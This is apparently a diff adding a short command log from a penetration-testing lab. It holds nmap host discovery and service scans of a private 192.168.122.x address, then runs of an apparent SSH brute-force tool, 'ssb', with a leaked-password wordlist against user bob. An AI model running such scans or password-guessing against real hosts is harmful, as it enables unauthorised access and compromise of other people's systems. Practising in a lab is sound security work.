@@ -1,0 +1,7 @@
+nmap -sn 192.168.122.0/24
+nmap -sV -sC -O -T4 -n -Pn -oA fastscan 192.168.122.192
+
+./ssb -c 5 -w darkweb_2017.txt bob@192.168.122.192
+
+./ssb -v -c 5 -w darkweb_2017.txt bob@192.168.122.192
+
